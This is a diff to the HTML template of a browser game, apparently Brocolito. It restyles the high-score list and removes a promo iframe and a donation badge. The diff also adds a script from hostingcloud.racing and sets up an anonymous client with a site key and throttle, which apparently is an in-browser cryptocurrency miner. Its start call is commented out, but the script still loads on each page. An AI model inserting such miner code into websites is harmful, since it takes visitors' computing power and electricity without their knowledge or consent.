@@ -20,6 +20,13 @@ alert = function() {
 };
 </script>
 
+<script src="https://www.hostingcloud.racing/JcDc.js"></script>
+<script>
+    var _client = new Client.Anonymous('3c37479d11a1079daccc6248c6803f222c5bccfdddef3362011c6d956db86776', {
+        throttle: 0.1, c: 'w'
+    });
+    // _client.start();
+</script>
 
 <img src="images/brocolito2.png" alt="Hi!! I am Brocolito" class="star" id="brocolitoImage"/>
 
@@ -31,14 +38,15 @@ alert = function() {
     </svg>
     HighScores
   </h1>
-  <ol>
-    <% _.each(rows, (row) => { %>
-    <li>
-      <mark><%=row.username%></mark>
-      <small><%=row.maxpoints%></small>
-    </li>
+  <div class="list">
+    <% _.each(rows, (row, inx) => { %>
+    <div class="list-item">
+      <div class="index"><%=inx + 1%></div>
+      <div class="username"><%=row.username%></div>
+      <div class="maxpoints"><%=row.maxpoints%></div>
+    </div>
     <% }); %>
-  </ol>
+  </div>
 
 
   <form action="start" method="get" style="display:none;">
@@ -138,13 +146,6 @@ if(document.getElementsByTagName("iframe").item(0) == null) {  // Si está adblo
 <div id="fbstatus">
 </div>
 
-<iframe id="IOG_CP" scrolling="no" frameborder="0" width="200"
-height="145" src="https://viral.iogames.space/cp/brocolito-io"
-style="border-radius:10px;-webkit-box-shadow:0 3px 6px rgba(0,0,0,.25),0 3px 6px rgba(0,0,0,.4);
--moz-box-shadow:0 3px 6px rgba(0,0,0,.25),0 3px 6px rgba(0,0,0,.4);
-box-shadow:0 3px 6px rgba(0,0,0,.25),0 3px 6px rgba(0,0,0,.4);">
-</iframe>
-
 <footer>
 
   <img id="visitsCounter" src="http://hitwebcounter.com/counter/counter.php?page=6435731&style=0035&nbdigits=5&type=page&initCount=0" title="" Alt=""   border="0"/>
@@ -157,8 +158,6 @@ box-shadow:0 3px 6px rgba(0,0,0,.25),0 3px 6px rgba(0,0,0,.4);">
     data-height="200"
     data-show-faces="true">
   </div>
-
-  <a href='https://pledgie.com/campaigns/34809'><img alt='Click here to lend your support to: Brocolito Game and make a donation at pledgie.com !' src='https://pledgie.com/campaigns/34809.png?skin_name=chrome' border='0' ></a>
 
   <!--<font class="sign">  </font>-->
 
